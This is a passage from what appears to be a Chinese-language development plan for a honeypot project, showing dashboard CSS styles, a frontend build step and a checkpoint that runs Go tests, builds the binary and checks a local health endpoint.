.stat-card { background: #0f172a; border-radius: 8px; padding: 20px; border: 1px solid #334155; }
.stat-card h3 { font-size: 13px; color: #64748b; margin-bottom: 8px; }
.stat-value { font-size: 28px; font-weight: 700; color: #38bdf8; }

table { width: 100%; border-collapse: collapse; margin: 12px 0; }
th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #334155; font-size: 14px; }
th { color: #64748b; font-weight: 600; }

.status-online { color: #4ade80; }
.severity-critical { color: #ef4444; font-weight: 600; }
.severity-high { color: #f97316; font-weight: 600; }
.severity-medium { color: #eab308; }

.section { margin-bottom: 24px; }
```

- [ ] **Step 4: 构建并验证**

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot/web
npm run build
```

Expected: 构建成功

---

## 验证 Checkpoint

所有模块编译验证通过后，执行全量测试：

```bash
cd /Users/kiana/Downloads/code/Laji-HoneyPot
go test ./... -v
go build -o honeypot ./cmd/honeypot/
./honeypot &
sleep 2
curl -s http://localhost:8080/healthz || echo "API not yet implemented"
kill %1
```
